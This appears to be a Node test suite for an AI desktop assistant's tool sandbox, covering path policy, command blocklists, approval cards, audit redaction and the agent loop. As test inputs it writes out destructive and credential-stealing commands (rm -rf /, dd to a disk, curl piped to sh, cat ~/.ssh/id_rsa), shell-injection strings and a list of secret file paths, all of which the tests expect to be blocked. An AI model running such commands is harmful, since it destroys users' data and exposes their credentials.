import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, readFileSync, existsSync, realpathSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import * as policy from '../src/main/tools/policy.ts';
import { ApprovalManager } from '../src/main/tools/approval.ts';
import { AuditLog, redact } from '../src/main/tools/audit.ts';
import { createRegistry, toDefinitions } from '../src/main/tools/registry.ts';
import { ToolRuntime } from '../src/main/tools/runtime.ts';
import { runToolLoop, ToolsUnsupportedError, ToolLoopHttpError } from '../src/main/tools/agent-loop.ts';
import { DEFAULT_SETTINGS, validSettings } from '../src/shared/validation.ts';

const home = realpathSync(mkdtempSync(join(tmpdir(), 'sudo-tools-')));
mkdirSync(join(home, '.ssh'));
writeFileSync(join(home, '.ssh', 'id_rsa'), 'PRIVATE');
writeFileSync(join(home, '.env'), 'GROQ_API_KEY=gsk_abcdefghijklmnop');
writeFileSync(join(home, '.bash_history'), 'secret commands');
mkdirSync(join(home, 'docs'));
writeFileSync(join(home, 'docs', 'notes.txt'), 'hello world\nsecond line\n');
writeFileSync(join(home, 'docs', 'todo.md'), 'buy milk\n');
symlinkSync(join(home, '.ssh'), join(home, 'docs', 'sneaky'));
const outside = realpathSync(mkdtempSync(join(tmpdir(), 'sudo-outside-')));
writeFileSync(join(outside, 'x.txt'), 'outside');
symlinkSync(outside, join(home, 'docs', 'to-outside'));

// ------------------------------------------------------------------ path policy
test('path policy: normal files in home are allowed, ~ and relative paths resolve inside home', () => {
  assert.equal(policy.checkPath('~/docs/notes.txt', { home }).verdict, 'allow');
  assert.equal(policy.checkPath('docs/notes.txt', { home }).verdict, 'allow');
  assert.equal(policy.checkPath('docs/notes.txt', { home }).path, join(home, 'docs', 'notes.txt'));
  assert.equal(policy.checkPath('~', { home }).verdict, 'allow');
});

test('path policy: secrets are denied (ssh, .env, history, our own config, cookies)', () => {
  for (const p of ['~/.ssh/id_rsa', '~/.ssh', '~/.env', '~/.bash_history', '~/.config/Sudo-chan/config.json', '~/.config/google-chrome/Default/Cookies', '~/proj/.env.local', '~/.gnupg/x', '~/.codex/auth.json']) {
    assert.equal(policy.checkPath(p, { home }).verdict, 'deny', p);
  }
  assert.equal(policy.checkPath('~/proj/.env.example', { home }).verdict, 'allow');
});

test('path policy: traversal out of home needs confirmation for reads and is denied for writes', () => {
  const read = policy.checkPath('../../../../../../etc/hostname', { home });
  assert.equal(read.verdict, 'confirm');
  assert.equal(read.outsideHome, true);
  assert.equal(policy.checkPath('/etc/hostname', { home, write: true }).verdict, 'deny');
  assert.equal(policy.checkPath('/etc/shadow', { home }).verdict, 'deny');
  assert.equal(policy.checkPath('/root/.bashrc', { home }).verdict, 'deny');
});

test('path policy: a symlink cannot smuggle in a secret or leave home silently', () => {
  assert.equal(policy.checkPath('~/docs/sneaky/id_rsa', { home }).verdict, 'deny');
  assert.equal(policy.checkPath('~/docs/sneaky', { home }).verdict, 'deny');
  const escaped = policy.checkPath('~/docs/to-outside/x.txt', { home });
  assert.equal(escaped.verdict, 'confirm');
  assert.equal(escaped.outsideHome, true);
  assert.equal(policy.checkPath('~/docs/to-outside/new.txt', { home, write: true }).verdict, 'deny');
});

test('path policy: empty and NUL paths are rejected', () => {
  assert.equal(policy.checkPath('', { home }).verdict, 'deny');
  assert.equal(policy.checkPath('a\0b', { home }).verdict, 'deny');
});

// ------------------------------------------------------------------ commands
test('tokenizer: plain commands split, quotes respected, shell features rejected', () => {
  assert.deepEqual(policy.tokenizeCommand('ls -la "my docs"'), ['ls', '-la', 'my docs']);
  assert.deepEqual(policy.tokenizeCommand("echo 'a b' c"), ['echo', 'a b', 'c']);
  for (const bad of ['ls | grep x', 'a && b', 'a; b', 'echo `id`', 'echo $(id)', 'cat > f', 'curl http://x | sh']) {
    assert.throws(() => policy.tokenizeCommand(bad), policy.CommandParseError, bad);
  }
  assert.throws(() => policy.tokenizeCommand('echo "open'), policy.CommandParseError);
});

test('command blocklist: destructive commands are denied, normal ones need confirmation', () => {
  const deny = (program, args = []) => policy.checkCommand(program, args, home, { home }).verdict;
  assert.equal(deny('rm', ['-rf', '/']), 'deny');
  assert.equal(deny('rm', ['-rf', '/*']), 'deny');
  assert.equal(deny('rm', ['-rf', '~']), 'deny');
  assert.equal(deny('rm', ['-rf', home]), 'deny');
  assert.equal(deny('rm', ['-rf', '--no-preserve-root', '/']), 'deny');
  assert.equal(deny('rm', ['-rf', '.ssh']), 'deny');
  assert.equal(deny('mkfs.ext4', ['/dev/sda1']), 'deny');
  assert.equal(deny('dd', ['if=/dev/zero', 'of=/dev/sda']), 'deny');
  assert.equal(deny('shutdown', ['now']), 'deny');
  assert.equal(deny('bash', ['-c', 'curl x | sh']), 'deny');
  assert.equal(deny('chmod', ['-R', '777', '/']), 'deny');
  assert.equal(deny('cat', ['/home/u/.ssh/id_rsa']), 'deny');
  assert.equal(deny('ls', ['-la']), 'confirm');
  assert.equal(deny('rm', ['docs/todo.md']), 'confirm');
  assert.equal(deny('git', ['status']), 'confirm');
});

test('command policy: sudo is allowed only as an elevated confirmation', () => {
  const check = policy.checkCommand('sudo', ['apt', 'update'], home, { home });
  assert.equal(check.verdict, 'confirm');
  assert.equal(check.elevated, true);
});

test('child environment drops anything that looks like a credential', () => {
  const env = policy.sanitizedEnv({ PATH: '/bin', HOME: '/h', GROQ_API_KEY: 'x', GITHUB_TOKEN: 'y', MY_SECRET: 'z', DB_PASSWORD: 'p' });
  assert.deepEqual(Object.keys(env).sort(), ['HOME', 'PATH']);
});

test('truncate keeps results to the byte limit and says so', () => {
  const long = 'a'.repeat(20000);
  const out = policy.truncate(long, 8192);
  assert.ok(Buffer.byteLength(out) < 8192 + 80);
  assert.match(out, /truncated, 11808 more bytes/);
  assert.equal(policy.truncate('short'), 'short');
});

test('url and app name checks', () => {
  assert.equal(policy.checkUrl('https://example.com/a').ok, true);
  assert.equal(policy.checkUrl('file:///etc/passwd').ok, false);
  assert.equal(policy.checkUrl('javascript:alert(1)').ok, false);
  assert.equal(policy.checkAppName('firefox').ok, true);
  assert.equal(policy.checkAppName('bash').ok, false);
  assert.equal(policy.checkAppName('rm -rf').ok, false);
  assert.equal(policy.checkAppName('../evil').ok, false);
});

// ------------------------------------------------------------------ approval
function fakeTimers() {
  const timers = [];
  return {
    timers,
    setTimer: (fn, ms) => { const t = { fn, ms, cleared: false }; timers.push(t); return t; },
    clearTimer: t => { t.cleared = true; },
    fire: () => { for (const t of timers) if (!t.cleared) { t.cleared = true; t.fn(); } },
  };
}
const card = (extra = {}) => ({ tool: 'run_command', risk: 'command', title: 't', detail: 'd', ...extra });

test('approval: default deny on timeout, nothing is approved by default', async () => {
  const timers = fakeTimers();
  const shown = [];
  const manager = new ApprovalManager({ emit: r => { shown.push(r); return true; }, ...timers });
  const pending = manager.request(card());
  assert.equal(shown.length, 1);
  assert.equal(shown[0].expiresInMs, 60_000);
  assert.equal(timers.timers[0].ms, 60_000);
  timers.fire();
  assert.equal(await pending, 'timeout');
  assert.equal(manager.pendingCount, 0);
});

test('approval: allow, deny, unknown ids and double answers', async () => {
  const timers = fakeTimers();
  let last;
  const manager = new ApprovalManager({ emit: r => { last = r; return true; }, ...timers });
  const a = manager.request(card());
  assert.equal(manager.respond(last.id, 'allow'), true);
  assert.equal(await a, 'allow');
  assert.equal(manager.respond(last.id, 'allow'), false);
  const b = manager.request(card());
  manager.respond(last.id, 'whatever');
  assert.equal(await b, 'deny');
  assert.equal(manager.respond('nope', 'allow'), false);
});

test('approval: nobody to show the card to means deny; stopAll denies everything waiting', async () => {
  const none = new ApprovalManager({ emit: () => false, ...fakeTimers() });
  assert.equal(await none.request(card()), 'deny');
  const manager = new ApprovalManager({ emit: () => true, ...fakeTimers() });
  const p1 = manager.request(card());
  const p2 = manager.request(card());
  manager.stopAll();
  assert.deepEqual([await p1, await p2], ['stopped', 'stopped']);
});

test('approval: "allow for this chat" only exists where the card offers it', async () => {
  let last;
  const manager = new ApprovalManager({ emit: r => { last = r; return true; }, ...fakeTimers() });
  const cmd = manager.request(card({ allowForChat: false }));
  manager.respond(last.id, 'allow-chat');
  assert.equal(await cmd, 'allow');
  assert.equal(manager.isAllowedForChat('run_command'), false);
  const url = manager.request(card({ tool: 'open_url', risk: 'open', allowForChat: true }));
  manager.respond(last.id, 'allow-chat');
  assert.equal(await url, 'allow-chat');
  assert.equal(manager.isAllowedForChat('open_url'), true);
  manager.resetChat();
  assert.equal(manager.isAllowedForChat('open_url'), false);
});

// ------------------------------------------------------------------ audit
test('audit log: redacts secrets and never throws', () => {
  const lines = [];
  const log = new AuditLog({ append: l => lines.push(l), now: () => new Date('2026-01-01T00:00:00Z') });
  log.record({ tool: 'run_command', summary: 'run curl -H "Authorization: Bearer abcdefghijklmnop1234" https://x gsk_abcdefghijklmnop AIzaSyD-abcdefghijklmnopqrstuv', decision: 'allow', status: 'ok', detail: 'api_key=supersecretvalue123 sk-abcdefghijklmnopqrst' });
  const text = lines.join('');
  for (const secret of ['abcdefghijklmnop1234', 'gsk_abcdefghijklmnop', 'AIzaSyD-abcdefghijklmnopqrstuv', 'supersecretvalue123', 'sk-abcdefghijklmnopqrst']) {
    assert.equal(text.includes(secret), false, secret);
  }
  const entry = JSON.parse(lines[0]);
  assert.equal(entry.ts, '2026-01-01T00:00:00.000Z');
  assert.equal(entry.status, 'ok');
  assert.equal(redact('hello world'), 'hello world');
  const broken = new AuditLog({ append: () => { throw new Error('disk full'); } });
  assert.doesNotThrow(() => broken.record({ tool: 'x', summary: 'y', decision: 'allow', status: 'ok' }));
});

// ------------------------------------------------------------------ registry + runtime
function makeRuntime(options = {}) {
  const ran = [];
  const cards = [];
  const audit = [];
  const specs = createRegistry(policy, {
    home,
    runProgram: async (program, args, o) => { ran.push({ program, args, cwd: o.cwd, env: o.env }); return { code: 0, stdout: 'out', stderr: '', timedOut: false, aborted: false }; },
    openDetached: async (program, args) => { ran.push({ open: program, args }); return { ok: true }; },
  });
  const approval = options.approval ?? new ApprovalManager({ emit: r => { cards.push(r); return true; }, ...fakeTimers() });
  const runtime = new ToolRuntime({
    specs,
    definitions: toDefinitions(specs),
    approval,
    audit: { record: e => audit.push(e) },
    isEnabled: options.isEnabled ?? (() => true),
    redact,
  });
  return { runtime, ran, cards, audit, approval };
}
const live = new AbortController().signal;
const tick = () => new Promise(r => setTimeout(r, 120));

test('tools: definitions are valid OpenAI function schemas', () => {
  const { runtime } = makeRuntime();
  const names = runtime.definitions.map(d => d.function.name).sort();
  assert.deepEqual(names, ['append_file', 'edit_file', 'get_system_info', 'list_dir', 'open_app', 'open_url', 'read_file', 'run_command', 'search_files', 'write_file']);
  for (const d of runtime.definitions) {
    assert.equal(d.type, 'function');
    assert.equal(d.function.parameters.type, 'object');
    assert.ok(d.function.description.length > 10);
  }
});

test('read tools run without a card inside home; secrets are blocked', async () => {
  const { runtime, cards, audit } = makeRuntime();
  assert.match(await runtime.execute('read_file', { path: '~/docs/notes.txt' }, 'c1', live), /hello world/);
  assert.match(await runtime.execute('list_dir', { path: '~/docs' }, 'c2', live), /notes\.txt/);
  const listing = await runtime.execute('list_dir', { path: '~' }, 'c3', live);
  assert.equal(listing.includes('.ssh'), false);
  assert.equal(listing.includes('.env'), false);
  assert.match(await runtime.execute('read_file', { path: '~/.ssh/id_rsa' }, 'c4', live), /^Blocked/);
  assert.match(await runtime.execute('read_file', { path: '~/.env' }, 'c5', live), /^Blocked/);
  assert.match(await runtime.execute('search_files', { query: 'notes' }, 'c6', live), /notes\.txt/);
  assert.match(await runtime.execute('search_files', { query: 'milk', content: true }, 'c7', live), /todo\.md:1/);
  assert.equal(cards.length, 0);
  assert.ok(audit.some(e => e.status === 'denied' && e.tool === 'read_file'));
});

test('read outside home needs an approval card', async () => {
  const { runtime, cards, approval } = makeRuntime();
  const pending = runtime.execute('read_file', { path: join(outside, 'x.txt') }, 'c1', live);
  await tick();
  assert.equal(cards.length, 1);
  assert.equal(cards[0].elevated, true);
  approval.respond(cards[0].id, 'allow');
  assert.match(await pending, /outside/);
});

test('write_file: shows a preview card, writes only after Allow, nothing on Deny', async () => {
  const { runtime, cards, approval, audit } = makeRuntime();
  const target = join(home, 'docs', 'new.txt');
  const denied = runtime.execute('write_file', { path: '~/docs/new.txt', content: 'abc\ndef' }, 'w1', live);
  await tick();
  assert.equal(cards[0].risk, 'write');
  assert.match(cards[0].detail, /New file/);
  assert.match(cards[0].detail, /abc/);
  approval.respond(cards[0].id, 'deny');
  assert.match(await denied, /denied/);
  assert.equal(existsSync(target), false);

  const allowed = runtime.execute('write_file', { path: '~/docs/new.txt', content: 'abc\ndef' }, 'w2', live);
  await tick();
  approval.respond(cards[1].id, 'allow');
  assert.match(await allowed, /OK: wrote 7 bytes/);
  assert.equal(readFileSync(target, 'utf8'), 'abc\ndef');

  const over = runtime.execute('write_file', { path: '~/docs/new.txt', content: 'abc\nxyz\nmore' }, 'w3', live);
  await tick();
  assert.match(cards[2].detail, /OVERWRITES/);
  assert.match(cards[2].detail, /\+\d+ \/ -\d+ lines/);
  approval.respond(cards[2].id, 'allow');
  await over;

  const app = runtime.execute('append_file', { path: '~/docs/new.txt', content: '\nend' }, 'w4', live);
  await tick();
  approval.respond(cards[3].id, 'allow');
  await app;
  assert.ok(readFileSync(target, 'utf8').endsWith('\nend'));
  assert.equal(audit.filter(e => e.tool === 'write_file' && e.status === 'ok').length, 2);
  // audit never carries file contents
  assert.equal(JSON.stringify(audit).includes('abc\\ndef'), false);
});

test('write_file: outside home, secrets and oversized content are refused without a card', async () => {
  const { runtime, cards } = makeRuntime();
  assert.match(await runtime.execute('write_file', { path: '/etc/evil', content: 'x' }, 'w1', live), /^Blocked/);
  assert.match(await runtime.execute('write_file', { path: '~/.ssh/authorized_keys', content: 'x' }, 'w2', live), /^Blocked/);
  assert.match(await runtime.execute('write_file', { path: '~/.bashrc2', content: 'x'.repeat(300 * 1024) }, 'w3', live), /too large/);
  assert.match(await runtime.execute('write_file', { path: '~/docs/sneaky/pwn', content: 'x' }, 'w4', live), /^Blocked/);
  assert.equal(cards.length, 0);
});

test('run_command: always asks, runs with sanitized env, truncates, blocks destructive and shell syntax', async () => {
  const { runtime, cards, approval, ran } = makeRuntime();
  process.env.GROQ_API_KEY = 'should-not-leak';
  const p = runtime.execute('run_command', { program: 'ls', args: ['-la'] }, 'r1', live);
  await tick();
  assert.equal(cards[0].risk, 'command');
  assert.match(cards[0].detail, /ls -la/);
  assert.equal(ran.length, 0, 'must not run before approval');
  approval.respond(cards[0].id, 'allow');
  assert.match(await p, /Exit code: 0[\s\S]*out/);
  assert.equal(ran[0].env.GROQ_API_KEY, undefined);
  delete process.env.GROQ_API_KEY;

  assert.match(await runtime.execute('run_command', { command: 'rm -rf /' }, 'r2', live), /^Blocked/);
  assert.match(await runtime.execute('run_command', { command: 'ls | grep x' }, 'r3', live), /^Blocked.*Shell features/);
  assert.match(await runtime.execute('run_command', { command: 'cat ~/.ssh/id_rsa' }, 'r4', live), /^Blocked/);
  assert.equal(cards.length, 1);

  const sudo = runtime.execute('run_command', { program: 'sudo', args: ['id'] }, 'r5', live);
  await tick();
  assert.equal(cards[1].elevated, true);
  approval.respond(cards[1].id, 'deny');
  await sudo;
  assert.equal(ran.length, 1);
});

test('run_command output is truncated to the limit', async () => {
  const specs = createRegistry(policy, {
    home,
    runProgram: async () => ({ code: 0, stdout: 'x'.repeat(50_000), stderr: '', timedOut: false, aborted: false }),
    openDetached: async () => ({ ok: true }),
  });
  const approval = new ApprovalManager({ emit: r => { setImmediate(() => approval.respond(r.id, 'allow')); return true; }, ...fakeTimers() });
  const runtime = new ToolRuntime({ specs, definitions: toDefinitions(specs), approval, audit: { record() {} }, isEnabled: () => true });
  const out = await runtime.execute('run_command', { program: 'yes' }, 'r1', live);
  assert.ok(Buffer.byteLength(out) < 8192 + 100);
  assert.match(out, /truncated/);
});

test('open_url: http(s) only; allow-for-chat skips later cards, open_app asks every time', async () => {
  const { runtime, cards, approval, ran } = makeRuntime();
  assert.match(await runtime.execute('open_url', { url: 'file:///etc/passwd' }, 'u1', live), /^Blocked/);
  const first = runtime.execute('open_url', { url: 'https://example.com' }, 'u2', live);
  await tick();
  assert.equal(cards[0].allowForChat, true);
  approval.respond(cards[0].id, 'allow-chat');
  assert.match(await first, /opened/);
  assert.match(await runtime.execute('open_url', { url: 'https://example.org' }, 'u3', live), /opened/);
  assert.equal(cards.length, 1);
  assert.deepEqual(ran.map(r => r.open), ['xdg-open', 'xdg-open']);
  const app = runtime.execute('open_app', { name: 'firefox' }, 'u4', live);
  await tick();
  assert.equal(cards.length, 2);
  assert.equal(cards[1].allowForChat, undefined);
  approval.respond(cards[1].id, 'deny');
  assert.match(await app, /NOT done/);
});

test('runtime: tools toggle OFF, unknown tool and bad arguments', async () => {
  const off = makeRuntime({ isEnabled: () => false });
  assert.match(await off.runtime.execute('read_file', { path: '~/docs/notes.txt' }, 'c', live), /turned off/);
  const { runtime } = makeRuntime();
  assert.match(await runtime.execute('format_disk', {}, 'c', live), /unknown tool/);
  assert.match(await runtime.execute('read_file', 'oops', 'c', live), /JSON object/);
  assert.match(await runtime.execute('read_file', {}, 'c', live), /path is required/);
});

test('runtime: approval timeout and Stop all end in "NOT done" and never run the action', async () => {
  const timers = fakeTimers();
  const cards = [];
  const approval = new ApprovalManager({ emit: r => { cards.push(r); return true; }, ...timers });
  const { runtime, ran, audit } = makeRuntime({ approval });
  const slow = runtime.execute('run_command', { program: 'ls' }, 'c1', live);
  await tick();
  timers.fire();
  assert.match(await slow, /did not respond in time.*NOT done/);
  const stopped = runtime.execute('run_command', { program: 'ls' }, 'c2', live);
  await tick();
  runtime.stopAll();
  assert.match(await stopped, /stopped.*NOT done/);
  assert.equal(ran.length, 0);
  assert.deepEqual(audit.map(e => e.status), ['timeout', 'aborted']);
});

test('runtime: Stop all aborts a command that is already running', async () => {
  const cards = [];
  let seenSignal;
  const specs = createRegistry(policy, {
    home,
    runProgram: (program, args, o) => new Promise(resolve => {
      seenSignal = o.signal;
      o.signal.addEventListener('abort', () => resolve({ code: null, stdout: '', stderr: '', timedOut: false, aborted: true }));
    }),
    openDetached: async () => ({ ok: true }),
  });
  const approval = new ApprovalManager({ emit: r => { cards.push(r); setImmediate(() => approval.respond(r.id, 'allow')); return true; }, ...fakeTimers() });
  const runtime = new ToolRuntime({ specs, definitions: toDefinitions(specs), approval, audit: { record() {} }, isEnabled: () => true });
  const running = runtime.execute('run_command', { program: 'sleep', args: ['100'] }, 'c1', live);
  await new Promise(r => setTimeout(r, 20));
  assert.equal(runtime.activeCommands, 1);
  runtime.stopAll();
  assert.match(await running, /cancelled/);
  assert.equal(seenSignal.aborted, true);
  assert.equal(runtime.activeCommands, 0);
});

// ------------------------------------------------------------------ agent loop
const json = (body, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });
const toolCall = (name, args, id = 'call_1') => ({ choices: [{ message: { content: null, tool_calls: [{ id, type: 'function', function: { name, arguments: typeof args === 'string' ? args : JSON.stringify(args) } }] } }] });
const answer = text => ({ choices: [{ message: { content: text } }] });
function loopOptions(fetchFn, tools, extra = {}) {
  const texts = [];
  return {
    texts,
    options: {
      fetchFn, endpoint: 'https://example.test/v1/chat/completions', apiKey: 'k', model: 'm',
      messages: [{ role: 'system', content: 'sys' }, { role: 'user', content: 'read my notes' }],
      tools, signal: live, onText: t => texts.push(t), sleep: async () => {}, ...extra,
    },
  };
}

test('agent loop: model calls a tool, result is fed back, final answer is delivered', async () => {
  const bodies = [];
  const replies = [toolCall('read_file', { path: '~/docs/notes.txt' }), answer('Your notes say hello world.')];
  const { runtime } = makeRuntime();
  const { options, texts } = loopOptions(async (url, init) => { bodies.push(JSON.parse(init.body)); return json(replies.shift()); }, runtime);
  const result = await runToolLoop(options);
  assert.deepEqual(texts, ['Your notes say hello world.']);
  assert.equal(result.toolCalls, 1);
  assert.equal(bodies[0].tools.length, 10);
  assert.equal(bodies[0].stream, false);
  const secondMessages = bodies[1].messages;
  assert.equal(secondMessages.at(-2).role, 'assistant');
  assert.equal(secondMessages.at(-2).tool_calls[0].function.name, 'read_file');
  assert.equal(secondMessages.at(-1).role, 'tool');
  assert.equal(secondMessages.at(-1).tool_call_id, 'call_1');
  assert.match(secondMessages.at(-1).content, /hello world/);
});

test('agent loop: a denied action is reported to the model as NOT done', async () => {
  const bodies = [];
  const replies = [toolCall('write_file', { path: '~/docs/x.txt', content: 'x' }), answer('You declined, so I did not write it.')];
  const approval = { request: async () => 'deny', isAllowedForChat: () => false, stopAll() {} };
  const { runtime } = makeRuntime({ approval });
  const { options, texts } = loopOptions(async (url, init) => { bodies.push(JSON.parse(init.body)); return json(replies.shift()); }, runtime);
  await runToolLoop(options);
  assert.match(bodies[1].messages.at(-1).content, /denied.*NOT done/);
  assert.equal(existsSync(join(home, 'docs', 'x.txt')), false);
  assert.equal(texts.length, 1);
});

test('agent loop: provider that rejects tools throws ToolsUnsupportedError so chat can fall back', async () => {
  const { runtime } = makeRuntime();
  const { options } = loopOptions(async () => json({ error: { message: 'tools is not supported for this model' } }, 400), runtime);
  await assert.rejects(runToolLoop(options), ToolsUnsupportedError);
  const other = loopOptions(async () => json({ error: { message: 'invalid api key' } }, 401), runtime);
  await assert.rejects(runToolLoop(other.options), error => error instanceof ToolLoopHttpError && error.status === 401);
});

test('agent loop: at most 6 tool steps, then one final call without tools', async () => {
  const bodies = [];
  const { runtime } = makeRuntime();
  let n = 0;
  const { options, texts } = loopOptions(async (url, init) => {
    const body = JSON.parse(init.body);
    bodies.push(body);
    return body.tools ? json(toolCall('get_system_info', {}, `call_${++n}`)) : json(answer('Stopped after the step limit.'));
  }, runtime);
  const result = await runToolLoop(options);
  assert.equal(result.toolCalls, 6);
  assert.equal(bodies.length, 7);
  assert.equal(bodies.filter(b => b.tools).length, 6);
  assert.equal(bodies.at(-1).tools, undefined);
  assert.deepEqual(texts, ['Stopped after the step limit.']);
});

test('agent loop: invalid JSON arguments become an error result, 429 is retried, empty reply errors', async () => {
  const { runtime } = makeRuntime();
  const bodies = [];
  const replies = [json({}, 429), json(toolCall('read_file', '{not json')), json(answer('Sorry, let me retry.'))];
  const { options, texts } = loopOptions(async (url, init) => { bodies.push(JSON.parse(init.body)); return replies.shift(); }, runtime);
  await runToolLoop(options);
  assert.equal(bodies.length, 3);
  assert.match(bodies[2].messages.at(-1).content, /not a valid JSON object/);
  assert.deepEqual(texts, ['Sorry, let me retry.']);
  const empty = loopOptions(async () => json({ choices: [{ message: { content: '' } }] }), runtime);
  await assert.rejects(runToolLoop(empty.options), ToolLoopHttpError);
});

test('agent loop: tool results are redacted before the model sees them', async () => {
  const bodies = [];
  writeFileSync(join(home, 'docs', 'leak.txt'), 'token=abcdefghijklmnopqrstuvwxyz gsk_abcdefghijklmnop');
  const replies = [toolCall('read_file', { path: '~/docs/leak.txt' }), answer('ok')];
  const { runtime } = makeRuntime();
  const { options } = loopOptions(async (url, init) => { bodies.push(JSON.parse(init.body)); return json(replies.shift()); }, runtime);
  await runToolLoop(options);
  const fed = bodies[1].messages.at(-1).content;
  assert.equal(fed.includes('abcdefghijklmnopqrstuvwxyz'), false);
  assert.equal(fed.includes('gsk_abcdefghijklmnop'), false);
});

// ------------------------------------------------------------------ settings
test('settings: toolsEnabled defaults to OFF and is validated', () => {
  assert.equal(DEFAULT_SETTINGS.toolsEnabled, false);
  assert.equal(validSettings({ ...DEFAULT_SETTINGS, toolsEnabled: true }), true);
  assert.equal(validSettings({ ...DEFAULT_SETTINGS, toolsEnabled: 'yes' }), false);
  assert.equal(validSettings({ ...DEFAULT_SETTINGS, toolsEnabled: undefined }), true);
});
